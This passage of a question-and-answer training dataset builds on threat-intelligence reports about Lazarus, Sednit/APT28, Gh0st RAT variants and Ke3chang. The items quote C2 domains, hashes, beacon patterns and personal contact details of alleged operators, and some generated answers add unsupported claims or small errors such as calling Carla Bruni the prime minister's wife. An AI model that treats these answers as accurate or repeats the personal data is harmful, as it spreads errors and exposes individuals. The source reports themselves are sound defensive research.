    "output": "The threat actor chose to use a malicious Excel file with VBA code because it leverages the trust users often place in common office documents, making it easier to deceive victims into opening the file. This method allows the malware to execute without raising immediate suspicion. The sophistication of the threat actor is evident in the fact that, at the time of the report's publication, the malicious file was recognized as harmful by only one antivirus engine. This indicates that the attacker employed advanced techniques to evade detection, demonstrating a high level of professionalism.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2. Malware\nThe latest GhostSecret sample reported by McAfee\n(FE887FCAB66D7D7F79F05E0266C0649F0114BA7C) is from February 2018; we spotted the first sample of Wslink in late 2018 and fellow researchers reported hits in August 2018, which they disclosed after our publication. Hence, these samples were spotted a relatively short period of time apart.\nThe  indicate that the same development environment and projects of similar size were used in several other known Lazarus samples (e.g., 70DE783E5D48C6FBB576BC494BAF0634BC304FD6; 8EC9219303953396E1CB7105CDB18ED6C568E962). We found this overlap using the following rules that cover only these Wslink and Lazarus samples, which is an indicator with a low weight. We tested them on  and our internal file corpus.\nrich_signature.length == 80 and\npe.rich_signature.toolid(175, 30319) == 7 and pe.rich_signature.toolid(155, 30319) == 1 and pe.rich_signature.toolid(158, 30319) == 10 and pe.rich_signature.toolid(170, 30319) >= 90 and pe.rich_signature.toolid(170, 30319) <= 108\nThis rule can be translated to the following notation that is more readable and used by VirusTotal, where one can see the product version and build ID (VS2010 build 30319), number and type of source/object files used ([LTCG C++] where LTCG stands for Link Time Code Generation, [ASM], [ C ]), and number of exports ([EXP]) in the rule:\n[LTCG C++] VS2010 build 30319 count=7\n[EXP] VS2010 build 30319 count=1\n[ASM] VS2010 build 30319 count=10\n[ C ] VS2010 build 30319 count in [ 90 .. 108 ]\nThe GhostSecret article described \"a unique data-gathering and implant-installation component that listens on port 443 for inbound control server connections\" that additionally ran as a service. This is an accurate description of Wslink downloader behavior, apart from the port number, which can vary based on the configuration. To sum it up, even though the implementation is different, both serve the same purpose.\nThe loader is virtualized by Oreans' Code Virtualizer, which is a commercial protector that is used (<https://www.welivesecurity.com/2020/11/16/lazarus-supply-chain-attack-south-korea/>)frequently by Lazarus.\nThe loader uses the (<https://github.com/fancycode/MemoryModule>)MemoryModule library to load modules directly from memory. The library is not commonly used by malware, but it is quite popular among North Korea-aligned groups such as Lazarus and Kimsuky.\nOverlap in the code between WinorDLL64 and GhostSecret that we found during our analysis. The results and the significance in attribution are listed in Table 1.\nTable 1. Similarities between WinorDLL64 and GhostSecret and their significance in attributing both to the same threat actor\nCode overlap in the file sending functionality is highlighted in Figure 2 and Figure 3.\nBig Headline: Technical analysis\nWinorDLL64 serves as a backdoor that most notably acquires extensive system information, provides means for file manipulation, and executes additional commands. Interestingly, it communicates over a TCP connection that was already established by its loader and uses some of the loader's functions.\nThe backdoor is a DLL with a single unnamed export that accepts one parameter \u2013 a structure for communication that was already described in our (<https://www.welivesecurity.com/2021/10/27/wslink-unique-undocumented-malicious-loader-runs-server/>)previous blogpost. The structure contains a TLS-context \u2013 socket, key, IV \u2013 and callbacks for sending and receiving messages encrypted with 256-bit AES-CBC that enable WinorDLL64 to exchange data securely with the operator over an already established connection.\nThe following facts lead us to believe with high confidence that the library is indeed part of Wslink:\nThe unique structure is used everywhere in the expected way, e.g., the TLS-context and other meaningful parameters are supplied in the anticipated order to the correct callbacks.\nThe name of the DLL is WinorDLL64.dll and Wslink's name was WinorLoaderDLL64.dll.\nWinorDLL64 accepts several commands. Figure 5 displays the loop that receives and handles commands. Each command is bound to a unique ID and accepts a configuration that contains additional parameters.\nThe command list, with our labels, is in Figure 6.\nTable 2 contains a summary of the WinorDLL64 commands, where modified, and old categories refer to the relationship to the previously documented GhostSecret functionality. We highlight only significant changes in the modified category.\nTable 2. Overview of backdoor commands\nBig Headline: Conclusion\nWslink's payload is dedicated to providing means for file manipulation, execution of further code, and obtaining extensive information about the underlying system that possibly can be leveraged later for lateral movement, due to specific interest in network sessions. The Wslink loader listens on a port specified in the configuration and can serve additional connecting clients, and even load various payloads.\nWinorDLL64 contains an overlap in the development environment, behavior, and code with several Lazarus samples, which indicates that it might be a tool from the vast arsenal of this North-Korea aligned APT group.\nESET Research offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the (<https://www.eset.com/int/business/services/threat-intelligence/?utm_source=welivesecurity.com&utm_medium=referral&utm_campaign=wls-research&utm_content=winordll64-backdoor-vast-lazarus-arsenal>)ESET Threat Intelligence page.\nQuestion: What are the primary functionalities of the WinorDLL64 backdoor, and how does it communicate with its operators?",
    "output": "Answer: The WinorDLL64 backdoor primarily acquires extensive system information, provides means for file manipulation (such as exfiltrating, overwriting, and removing files), and executes additional commands. It communicates over a TCP connection that was already established by its loader, Wslink, and uses some of the loader's functions. The backdoor is a DLL with a single unnamed export that accepts one parameter \u2013 a structure for communication containing a TLS-context (socket, key, IV) and callbacks for sending and receiving messages encrypted with 256-bit AES-CBC. This enables WinorDLL64 to exchange data securely with the operator over an already established connection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did Lazarus demonstrate its capability to attack all major operating systems, and what was the significance of the discovery of the SimpleTea code base?",
    "output": "Lazarus demonstrated its capability to attack all major operating systems by using macOS payloads against its targets. Samples of SimpleTea for macOS were uploaded to VirusTotal from Hong Kong and China, and a macOS WebbyTea downloader was discovered. The associated Python loader has code to pick a payload according to the OS it is executed on: Windows, Linux, or Darwin (the core Unix system of macOS). The discovery of the SimpleTea code base was significant because it revealed that the code used to compile the SimplexTea Linux backdoor was part of a common Lazarus code base used for all major desktop platforms. This commonality led to the decision to use the SimpleTea name for all malware derived from this common code base, highlighting Lazarus's versatility and broad targeting capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The Sednit Group\nThe Sednit group\u2014 variously also known as APT28, Fancy Bear, Sofacy, Pawn Storm, STRONTIUM and Tsar Team \u2014 is a group of attackers operating since 2004 if not earlier, whose main objective is to steal confidential information from specific targets. Over the past two years, this group's activity has increased significantly, with numerous attacks against government departments and embassies all over the world.\nAmong their most notable presumed targets are the American Democratic National Committee (<>)[1], the German parliament (<>)[2] and the French television network TV5Monde (<>)[3]. Moreover, the Sednit group has a special interest in Eastern Europe, where it regularly targets individuals and organizations involved in geopolitics.\nOne of the striking characteristics of the Sednit group is its ability to come up with brand-new 0-day (<>)[4] vulnerabilities regularly. In 2015, the group exploited no fewer than six 0-day vulnerabilities, as shown in Figure 1.\nThis high number of 0-day exploits suggests significant resources available to the Sednit group, either because the group members have the skills and time to find and weaponize these vulnerabilities, or because they have the budget to purchase the exploits.\nAlso, over the years the Sednit group has developed a large software ecosystem to perform its espionage activities. The diversity of this ecosystem is quite remarkable; it includes dozens of custom programs, with many of them being technically advanced, like the Xagent and Sedreco modular backdoors (described in the second part of this whitepaper), or the Downdelph bootkit and rootkit (described in the third part of this whitepaper).\nWe present the results of ESET's two-year pursuit of the Sednit group, during which we uncovered and analyzed many of their operations. We split our publication into three independent parts:\n1. \"Part 1: Approaching the Target\" describes the kinds of targets the Sednit group is after, and the methods used to attack them. It also contains a detailed analysis of the group's most-used reconnaissance malware.\n2. \"Part 2: Observing the Comings and Goings\" describes the espionage toolkit deployed on some target computers, plus a custom network tool used to pivot within the compromised organizations.\n3. \"Part 3: A Mysterious Downloader\" describes a surprising operation run by the Sednit group, during which a lightweight Delphi downloader was deployed with advanced persistence methods, including both a bootkit and a rootkit.\nEach of these parts comes with the related indicators of compromise.\nMedium Headline: The First Part of the Trilogy\nFigure 2 shows the main components that the Sednit group has used over the last two years, with their interrelationships. It should not be considered as a complete representation of their arsenal, which also includes numerous small custom tools.\nWe divide Sednit's software into three categories: the first-stage software serves for reconnaissance of a newly compromised host, then comes the second-stage software intended to spy on machines deemed interesting, while the pivot software finally allows the operators to reach other computers.\nIn this first part, we focus on Sednit's attack methods. Indeed, having reliable methods to compromise the computers of the intended targets with spying malware is one of the most important parts of a cyber espionage operation.\nThe components on which we focus in this first part are outlined in Figure 2, which includes the attack methods employed and the first-stage malware we call Seduploader, composed of a dropper and its associated payload.\nAll the components shown in Figure 2 are described in this whitepaper, with the exception of usbstealer, a tool to exfiltrate data from air-gapped machines that we have already described at WeLiveSecurity (<>)[5]. Recent versions have been documented by Kaspersky Labs (<>)[6] as well.\nMedium Headline: Attribution\nOne might expect this reference whitepaper to add new information about attribution. A lot has been said to link the Sednit group to some Russian entities (<>)[7], and we do not intend to add anything to this discussion.\nPerforming attribution in a serious, scientific manner is a hard problem that is out of scope of ESET's mission. As security researchers, what we call\"the Sednit group\" is merely a set of software and the related network infrastructure, which we can hardly correlate with any specific organization.\nNevertheless, our intensive investigation of the Sednit group has allowed us to collect numerous indicators of the language spoken by its developers and operators, as well as their areas of interest, as we will explain in this whitepaper.\nMedium Headline: Publication Strategy\nBefore entering the core content of this whitepaper, we would like to discuss our publication strategy. Indeed, as security researchers, two questions we always find difficult to answer when we write about an espionage group are\"when to publish?\", and\"how to make our publication useful to those tasked with defending against such attacks?\".\nThere were several detailed reports on the Sednit group published in 2014, like the Operation Pawn Storm report from Trend Micro (<>)[8] and the APT28 report from FireEye (<>)[9]. But since then the public information regarding this group mainly came in the form of blog posts describing specific components or attacks. In other words, no public attempts have been made to present the big picture on the Sednit group since 2014.\nMeanwhile, the Sednit group's activity significantly increased, and its arsenal differs from those described in previous whitepapers.\nTherefore, our intention here is to provide a detailed picture of the Sednit group's activities over the past two years. Of course, we have only partial visibility into those activities, but we believe that we possess enough information to draw a representative picture, which should in particular help defenders to handle Sednit compromises.\nWe tried to follow a few principles in order to make our whitepaper useful to the various types of readers:\n\u2022 Keep it readable: while we provide detailed technical descriptions, we have tried to make them readable, without sacrificing precision. This is the reason we decided to split our whitepaper into three independent parts, in order to make such a large amount of information easily digestible. We also have refrained from mixing indicators of compromise with the text.\n\u2022 Help the defenders: we provide indicators of compromise (IOC) to help detect current Sednit infections, and we group them in the and on ESET's GitHub account (<>)[10]. Hence, the reader interested only in these IOC can act directly, and find more context in the whitepaper afterwards.\n\u2022 Reference previous work: a high profile group such as Sednit is tracked by numerous entities. As with any research work, our investigation stands on the shoulders of the previous publications. We have referenced them appropriately, to the best of our knowledge.\n\u2022 Document also what we do not understand: we still have numerous open questions regarding Sednit, and we highlight them in our text. We hope this will encourage fellow malware researchers to help complete the puzzle.\nWe did our best to follow these principles, but there may be cases where we missed our aim. We encourage readers to provide feedback at , and we will update the whitepaper accordingly.\nBig Headline: Who ARE ThE TARgETS?\nIn order to set the scene for the Sednit group, we will first take a look at who their targets are. Indeed, knowing the targets of such a group allows us to get some idea of their motivations, their level of sophistication, and the interests they serve.\nIn a number of publicized cases high-profile entities have supposedly been attacked by the Sednit group, such as:\n\u2022 The American Democratic National Committee, in May 2016 (<>)[1]\n\u2022 The German parliament, in May 2015 (<>)[2]\n\u2022 The French television network TV5Monde, in April 2015 (<>)[3]\nSuch high-profile cases allow us to draw an initial conclusion: the Sednit group's objectives are connected to international geopolitics, and the group is definitely not\"afraid\" of targeting major entities. To continue this reasoning in more depth, we will describe in the next sections a list of targets for a phishing operation run by the Sednit group in 2015.\nSmall Headline: Context\nOne of the common attack methods used by the Sednit group\u2014see \u2014is spearphishing (sending targeted phishing emails) to steal webmail account credentials. To do so, the group creates fake login pages for various webmail services, and lures the targets into visiting the fake page and entering their credentials. This attack method was initially documented by Trend Micro (<>)[8] and PwC (<>)[11].\nFor example, Figure 3 shows a Sednit phishing email targeting Gmail users.\nThe link in this email points in reality to a Sednit domain name. If potential victims click on it, they will be redirected to a fake Gmail login panel, as shown in Figure 4. Hence, they will get the impression that they have to log in again in order to access the document mentioned in the email. Those who fall prey by entering their credentials will be redirected to the legitimate Google Drive webpage, while their credentials will be collected by Sednit.\nAn important point here is that the fake login panel displays the targets' names and email addresses, to reinforce the illusion they have been logged out from their real Gmail accounts.\nThe fake webmail login panels deployed by Sednit are usually just a copy of the real login panel source.\n\nWhy is the Sednit group's focus on Eastern Europe notable, and what does it imply about their objectives?",
    "output": "The Sednit group has a special interest in Eastern Europe, where it regularly targets individuals and organizations involved in geopolitics. This focus implies that the group's objectives are closely tied to international geopolitics and that they are not afraid to target major entities. Their activities in this region suggest a strategic interest in influencing or gathering intelligence on political and diplomatic affairs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: The variants\nThe Gh0st Rat source code (version 3.6) is freely available on the Internet, something that has made it quite popular and sparked a multitude of modifications. The resulting trojan can be hard to recognize as Gh0stRat, as attackers ditch various parts of the code that they don't need and add other functionality. In addition, the trojan is packaged in different ways \u2013 standalone, glued together with other files, included in self extracting archives. It is frequently obfuscated and compressed.\nAs a result of all this, antivirus naming is variable, to put it mildly. Most antivirus detections today are automatically generated, resulting in names thought out by machines. Quick, but containing information only machines find interesting.\nThe most stable indicator of being faced with a Gh0stRat is its network communication. It is well documented and quite distinctive, as it always begins with a \"magic word\" which in its default configuration is \"Gh0st\" \u2013 thus Gh0st Rat. Below is a typical packet (content data blurred)\nFig 1 The fields are magic identifier ('Gh0st'), size of packet, size of uncompressed packet, and lz-compressed data containing information about the compromised computer.\nThis magic tag is very easy to spot in network traffic, so the bad guys have come up with a countermeasure. They use other magics. I searched our in-house Malware Analyzer G2 (MAG2) pcaps for network traffic that matched the Gh0st packet format, and this showed about 50 different magics from the last few months. There are many more in existence \u2013 some are shown in Table 2, but as we had no traffic data on these, they were not investigated.\nThe length of the magic is by default 5 bytes, but this is not the case for all variants. In Table 1 there are magics with non-standard length \u2013 \"Spidern\" and \"W0LFKO\" \u2013 and we have seen others that were not included in this investigation, like \"DrAgOn\" and \"QQ_124971919\".\nThe Spidern variant is non-standard in another way as well. It does not compress its network traffic, something most other Gh0st do. However, when looking at the code in the disassembler IDA Pro, the code relationship is clearly visible.\nFig 2 Spidern vs Gh0st comparison\nBig Headline: Clusters and links\nClusters are composed of samples that share common traits. Usually this will be common magic tag, but this is not always the case. Sometimes clusters can form around other parameters, such as common command & control (C&C) infrastructure. Logical links between clusters occur when samples, infrastructure components or other factors exhibit traits that belong in more than one cluster. For example, a sample with a magic of \"cb1st\" obviously belongs in the cb1st cluster, but if the C&C server it connects to also accepts connections from samples using the magic \"whmhl\", then there is a logical link between the cb1st and whmhl clusters.  The strength of such links varies, as there always are possible sources of error which are difficult to map out fully. Such uncertainties can be to what extent is a malware variation shared or sold, or to what extent is command & control infrastructure hired out or shared.\nBecause of these uncertainties, we will only point out where links do exist, without offering hard conclusions.\nBig Headline: Overview plot \u2013 with Gh0st\nFig 3 Overview with the Gh0st cluster\nThis mosquito swarm consists of trojan files, interconnected primarily by their magic tag, but also by whatever other factor shared with other samples \u2013 which C&C server they dial back to, and sometimes which IP address this resolves to. The large kludge in the middle is the default Gh0st group totaling 522 nodes.\nA better overview is perhaps gained by removing the \"Gh0st\" cluster from the graph, as it is the default configuration and not usable for connecting clusters. Doing so results in a smaller set of more distinct clusters, where the connections are more visible.\nBig Headline: Example botnet infrastructure: wk1888.com\nA large amount of samples connected to www.wk1888.com. This host accepted connections from at least two botnet clusters \u2013 Gh0st on port 8000, and cb1st on port 8181. We have also seen Gh0st samples attempting to connect on port 8080 without being able to establish communication.\nThis multi-botnet support appears usually to be related to timing.  Based on the header timestamp of the trojan files, the port 8181 cb1st samples were predominantly created May-June 2011, while the port 8000 Gh0st samples were created Sept-Oct 2011.\nWK1888.COM has resolved to many IP addresses over time, all belonging to Krypt Technologies [AS 35908], a US-based VPS hosting service. At the time of writing the IP is 174.139.51.150. The same WHOIS info points to the domains af0575.com and fz0575.com, both associated with earlier Gh0st Rat samples, and to the domains wt1888.com and 81266966.com.\nThe wk1888.com host ran at one point a webserver on port 2011 where it hosted download information and more executables to download. A sample which used this functionality was a downloader executable (md5  b6e900f8a14740aa6ad3e755dc2d14bb), which performed the transaction below:\nThe 1.exe file (md5 00118d190f8a30e6dc70b394e603d155) is a Gh0st trojan of the cb1st cluster, connecting back to wk1888.com on port 8181. The xf80.exe file is a DarkShell DDOS trojan (md5 d47e37178c0d5b8780b97ce4e7c0e06b).\nSimilar functionality was seen on wt1888.com (e.g. ) (2), and on 81266966.com. The latter hosted downloader and DDOS trojans that connected back to wk1888.com (3)\nSmall Headline: BOYUL.COM\nAdministrative Contact: wenyan zhong 1377887494@qq.com telephone: +86.051052478530 fax    : +86.051052478531 jiangsu wuxi hehuali wuxi jiangsu 214000 CN\nBoyul.com resolves at the time of writing to the IP 174.139.63.18, which also belongs to Krypt Technologies and has historically even been resolved to by wk1888.com.\nThe data (phone/address) used to register boyul.com match literally thousands of other domain registrations: HON168.COM, 1585GB.COM, ZJHD518.COM, 17173CGW.COM etc.\nThe QQ address 1377887494 is used in several advertisements on the hacking forum my3800.com (Central China Honker Security):\n\u6bcf\u5929\u8d60\u900150\u53ea\u8089\u9e21\u5a31\u4e50\u8d85\u4f4e\u4ef7200\u5143\u4e00\u4e2a\u6708\u53e6\u51fa\u79df\u5c0f\u578b\u8089\u9e21\u5305\u5929\u5305\u6708\u4f4d\u7f6e\u8054\u7cfb\nQQ:1377887494\nTranslation:\n\"Selling undetected GH0ST kits. A package of 50 zombie machines (chicken) comes included, for 200 yuan (ca 35 USD) a month. Rent zombie machines pr day or pr month, contact me\".\nThe QQ number is also found on the forum beishan.info (4), where the poster complains about problems with the registration of the domain www.sock8.com, which he claims he has bought from a registered seller on taobao.com. Taobao is the Chinese version of eBay.\nThis post was made May 27th 2011. The WHOIS info for the sock8.com domain shows that May 19th it was apparently reclaimed by Netfirms and returned to a parking IP. Before this, the domain was registered by one \"bingxian feng\":\nAdministrative Info: bingxian feng bingxian feng na jiangmen, NA 529700\nChina\nPhone: +1.102251166 Fax..:\nEmail: a916196832@yahoo.com\nIn the period from the domain was registered by Bingxian Feng April 11th to its apparent seizure in May a number of Ghost trojans surfaced which connected to the sock8 domain. These had an apparent compile date April 12th and 13th .\nGoogling for Feng's email address in the WHOIS shows that it is used for registering literally hundreds of domains. Not only that, but it turns out that this player is well known (5), where this person allegedly has been involved in pornography, mobile phone scams,  game theft, and phishing attacks against among others People's bank of China.\nThere are several cyberpolice departments (also known as \"Net Cop\") in China, organized by regions.\nSmall Headline: PK39.COM\nAdministrative Contact:\nThe email 924539333@qq.com shows up a number of places through Google. One interesting reference is found on the site www.kissqc.com, which just says:\nThis is not the only defacement attributable to C\u01d2C\u01d2 \u2013 his name is found several places in similar fashion. He also appears to use another handle frequently associated with hacking.\nThese handles appear to match the online profile of a male in his mid-twenties, living in Changzhou in the Jiangsu province of China. He appears to be involved in many other projects, from Android development to network security tools. The word \"Ghost\" is ironically used in a lot of his projects.\nBig Headline: Cluster: IM007\nThe IM007 cluster surprisingly contains no samples. The reason it exists at all is that we have logged several C&C servers replying with this magic tag, so it is a reasonable assumption that there must exist samples that follow this protocol. The servers we have seen with this behavior have been used by the BeiJi, BEiLa and Wangz clusters, thus linking these. In at least two cases we have seen samples from these clusters showing images of Dungeon Fighter Online virtual items when run, apparently as a lure for game account theft.\nBamboo Bracelet, an expensive ingame item in DFO.\nBig Headline: Cluster: KrisR\nThe KrisR cluster consists of 205 samples. The magic tag is actually \"KrisRat\", but the tag is truncated in traffic to the regular first 5 bytes.\nBy far most samples connect back to haidishijie.3322.org, but many other C&C's are in use. This cluster links with:\nFLYNN: see FLYNN\nGh0st: f. ex. haidishijie.3322.org returned 'Gh0st' in all cases when receiving 'KrisR' on port 8888\nHXWAN: common C&C at ssky.8866.org\nLyyyy: common C&C at ssky.8866.org\nXDAPR: common C&C at ssky.8866.org cb1st: common C&C at daduji.3322.org\nFKJP3: common C&C at daduji.3322.org\nAnswer this question: What role does the 'magic word' play in the Gh0st Rat's network communication, and how do attackers exploit this feature to evade detection?",
    "output": "The 'magic word' in Gh0st Rat's network communication serves as a unique identifier at the beginning of each packet, typically 'Gh0st.' This makes it easy to spot in network traffic. Attackers exploit this feature by using different 'magic words' to avoid detection. For example, variants like 'Spidern' and 'W0LFKO' use non-standard 'magic words' and lengths. By altering this identifier, attackers can make their malicious activities less conspicuous and harder to trace.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: BS2005 campaign: \"snake\"\nIn 2011 a campaign, labeled \"snake\" by the attackers, started using the theme of nude photos of the French prime minister's wife, Carla Bruni, as a lure. Attackers sent an email to various targets that encouraged recipients to download a password-protected RAR file (see Figure 5).\nThe malware contained within the RAR was named \"carla_bruni_nude_pics_spp.scr\" (727ef86947f5e109435298e077296a42 ). When executed, the BS2005 malware connected to a CnC server with the following HTTP traffic pattern:\nPOST /ke3chang/Directx.aspx?r=<Base64 Encoded Data> HTTP/1.1\nAccept: */*\nAccept-Language: en-us\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0) Accept-Encoding: gzip, deflate\nHost: g20news.ns01.us\nContent-Length: 4\nConnection: Keep-Alive\nMedium Headline: BS2005 campaigns: \"dream/dolphin\"\nIn 2012, another series of attacks began that leveraged information about the London Olympics in an attempt to lure targets into clicking on malicious attachments (see Figure 6 and Figure 7). Based on information from the FireEye\u00ae Dynamic Threat Intelligence\u2122 (DTI) cloud, we observed that this campaign targeted a single firm in the Chemicals/Manufacturing/Mining sector.\nThese attacks leveraged older exploits in Adobe PDF Reader (CVE-2010-2883) and Microsoft Word (CVE-2010-3333). These BS2005-laced samples (ecc1167a5f45d72c899303f9bbe44bbc and b391d47b37841741a1817221b946854a) connected to the following CnC servers:\n\u2022 news.studenttrail.com\n\u2022 skyline.ns1.name\nThe HTTP callback pattern to the CnCs in these cases was modified slightly from the earlier path of \"/ke3chang/\" to \"/shfam9y/\".\nPOST /shfam9y/Default.aspx?r=<Base64 Encoded Data>a= HTTP/1.1\nThis could represent an attempt to avoid any network-based signatures that detect based on the specific URL path of earlier samples. Lastly, the addition constant for the CnC encryption routine in these two BS2005 samples is 0x7C.\nMedium Headline: BS2005 campaign: \"newtiger\"\nThree months after the Olympics-themed attacks, FireEye observed a new BS2005 campaign labeled \"newtiger,\" which is possibly a reference to an older 2010 campaign labeled \"tiger.\" The decoy content in this case is a threat report from a well-known security vendor (see Figure 8). Using information from the FireEye DTI cloud, FireEye observed that this campaign targeted a single firm in the Services/Consulting sector.\nThe sample used in this attack (50dd931b85891168244a10073f4a6f79) dropped BS2005 malware that connected to the CnC www.trap.dsmtp.com and used the \"/shfam9y/\" URI path.\nMedium Headline: MyWeb: Jan 2010 \u2013 May 2011\nThe Ke3chang attackers used the older \"MyWeb\" malware family from 2010 to 2011. The MyWeb sample that FireEye analyzed has a compile date of 1/20/2011. At least one of the attacks in this campaign leveraged a European security and defense-themed lure, which aligns with the targeting preferences for this group.\nMyWeb is the second-generation malware used by this threat actor; it was used after BMW but before BS2005. Improvements over BMW include an anti-sandbox detection technique, a configurable sleep value for the CnC beacon loop, and a consolidated configuration block that enables the malware author to change the CnC domain without having to recompile the malware.\nMyWeb's anti-sandbox detection technique calls GetSystemTime, saving the value, then looping 500,000 times calling GetSystemTime for each loop; finally, the malware compares the milliseconds value of the last call with the value saved from the first call. If the values are equal, the malware process terminates silently.\nThe MyWeb configuration is stored in a 104-byte block of encoded data appended to the end of the portable executable (PE) file. To decode the configuration data, each character has its positional index number added to it. The CnC domain is stored at offset 0x0. Upon successful connection to the CnC server, the malware sleeps for the amount of time that is stored in seconds at offset 0x20. The sleep value used for CnC connection failures is stored in minutes at offset 0x30.\nMyWeb only encrypts the command results data sent back to the CnC server using the same weak encryption algorithm as BS2005 (see Figure 2). The addition constant for the encryption routine for the sample we analyzed (be58180f4f7ee6a643ab1469a40ffbca) is 0x5A. The beacon data is transmitted in URL parameters in plaintext and is self-explanatory:\nhxxp://ensun.dyndns.org/MYWEB/SearchX.ASpX?id1=<local IP address>&id2=<computer name>&id3=<volume serial number>&id4=<32 random alphabet characters>\nDownloaded and uploaded files are simply Base64 encoded. Command results are encrypted and then Base64 encoded.\nMedium Headline: BMW: July 2010\nBMW is the earliest iteration of this malware that FireEye has seen and was used by the Ke3chang attackers in older 2010 attacks. The initial infection vector is unknown; however, BMW was presumed to be delivered via weaponized email attachments/links\u2014similar to the newer campaigns leveraging MyWeb and BS2005. The samples we analyzed have a compile date of 2010/07/08. This malware is known as BMW, due to the presence of this PDB string:\nBMW sample (649691e1d367721f0ff899fd31133915) beacons to CnC mail.yahoo.sendsmtp.com with the following fake HTTP traffic:\nPOST /<filename>.aspx?Random=<16 Random Alphabet Characters> HTTP/1.1\nAccept: text/html, application/xhtml+xml, */*\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\nAccept-Encoding: gzip, deflate\nHost: mail.yahoo.sendsmtp.com\nContent-Length: 144\nConnection: Keep-Alive\nSmall Headline: <Base64 Encoded Data>\nThe <filename> in the URI is randomly chosen from one of the following hard-coded entries within the malware binary:\n\u2022 acheb.aspx\n\u2022 bajree.aspx\n\u2022 cyacrin.aspx\n\u2022 dauber.aspx\n\u2022 eaves.aspx\nThe Base64 encoded data in the POST body decodes to the following:\n<Local IP address>\n<Computer name>\n<Domain>\n<Browser version>\n<Mail client>\n<Campaign marker>\n<Date/Time>\n<ProxyEnable/ProxyDisable>\n<Y/N> <second parameter of last CnC response>\n<Last command executed>\n<X Bytes>\n<Volume serial number>\nThe <Y/N> data indicates whether the malware is running inside a virtual machine. The <X Bytes> data indicates the number of bytes last downloaded from the download file command.\nBMW encrypts uploaded and downloaded files and command results before Base64 encoding them, using the same weak encryption algorithm as BS2005 (see Figure 2). The constant used for addition in the sample we analyzed is 0x5A.\nMedium Headline: BMW\n\u2022 mail.yahoo.sendsmtp.com\n\u2022 update.msntoole.com\nMyWeb\n\u2022 expo2010.zyns.com\n\u2022 win7.sixth.biz\n\u2022 ensun.dyndns.org\n\u2022 www.spaces.ddns.us\n\u2022 blog.strancorproduct.info5\n5 The sample was not located for this CnC; however, the callback and response captured by JsUnpack is consistent with the \"Eourdegh\" variant of the MyWeb malware, as outlined here: http://jsunpack.jeek.org/dec/go?report=e5f9dae61673a75db6dcb2475cb6ea8f22f66e9a\nWe have mapped out the relationship between the CnC servers for all three malware families and have found that they have shared common historical IP addresses in the past.\nUsing the IP addresses from the 23 CnC servers FireEye collected from our initial samples, we then mapped all the IP addresses that these domains resolved to. We then collected any other domains that also resolved to these IP addresses, resulting in at least 99 possible Ke3chang CnC servers.\nUpon further analysis, we find that these 99 CnC servers are primarily located in the U.S., China, and Hong Kong.\n\nQuestion: How did the Ke3chang attackers use the 'snake' campaign in 2011 to lure their targets, and what was the technical mechanism behind the malware execution and communication?\n\nAnswer:",
    "output": "In 2011, the Ke3chang attackers launched a campaign labeled 'snake,' which used the theme of nude photos of Carla Bruni, the French prime minister's wife, as a lure. They sent emails encouraging recipients to download a password-protected RAR file. The malware within the RAR file was named 'carla_bruni_nude_pics_spp.scr.' When executed, the BS2005 malware connected to a command-and-control (CnC) server with the following HTTP traffic pattern: POST /ke3chang/Directx.aspx?r=<Base64 Encoded Data> HTTP/1.1. The malware used specific headers such as 'Accept: */*', 'Accept-Language: en-us', and 'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)' to mimic legitimate traffic and avoid detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Network Indicators\nBelow we list a number of domains which you may wish to review network logs for. Typically registered domains are employed for phishing and/or malware command and control. This is a redacted list of domains that are likely related to Sofacy and we note that related domains have been observed by others6, as well as in the cited reports.\n1 Other names include APT28, Fancy Bear, Sednit and Pawn Storm.\n2 See\n3 See\n4 For example see\n5 See\n6 See\nBig Headline: References\n\uf0b7 \uf0b7 \uf0b7\n\uf0b7 \uf0b7\n\uf0b7\n\uf0b7 \uf0b7\nThe information contained in this document has been prepared as a matter of interest and for information purposes only, and does not constitute professional advice. You should not act upon the information contained in this email without obtaining specific professional advice. No representation or warranty (express or implied) is given as to the accuracy or completeness of the information contained in this email, and, to the extent permitted by law, PricewaterhouseCoopers LLP, its members, employees and agents do not accept or assume any liability, responsibility or duty of care for any consequences of you or anyone else acting, or refraining to act, in reliance on the information contained in this email or for any decision based on it.\nQ: Why might cyber security experts need to review network logs for domains associated with Sofacy, and what types of activities are these domains typically used for?",
    "output": "Cyber security experts need to review network logs for domains associated with Sofacy because these domains are often employed for phishing and/or malware command and control. By monitoring these domains, experts can detect and mitigate potential threats posed by Sofacy, also known as APT28, Fancy Bear, Sednit, and Pawn Storm. Phishing domains are used to trick users into revealing sensitive information, while command and control domains are used to manage and direct malware operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Source Code\nThis section shows some of the discoveries we made while trying to identify the functionality and use cases of each application we discovered. Nearly all of the samples were coded in C, specifically Visual C.\nThe directory structure of the source code appeared to be standard of directories written using C, Visual Studio\u00ae Express, or a litany of other tools. The code appeared to be very robust. We created a complete mind map of the code, its directories and the files located within the said directories.9\nThe applications in the following section are only a few of those that contained some of the most interesting details about our findings.\n9 Due to the number and depth of directories discovered, what has been included here is only a portion of the mind map we created.\nAnswer this question: Why did the authors of the 'Safe' campaign choose to use C and Visual Studio\u00ae Express for developing their malware, and how does understanding this choice help in analyzing and mitigating similar threats?",
    "output": "The authors of the 'Safe' campaign chose to use C and Visual Studio\u00ae Express because these tools provide a robust and efficient environment for coding complex applications. The directory structure of the source code followed standard conventions used in C programming, indicating a high level of organization and sophistication. Understanding this choice helps in analyzing the malware by allowing defenders to create detailed mind maps of the code, its directories, and the files within those directories. This comprehensive mapping enables better insight into the functionality and use cases of each application, aiding in the development of effective countermeasures against similar threats.",
    "category": "apt-notes",
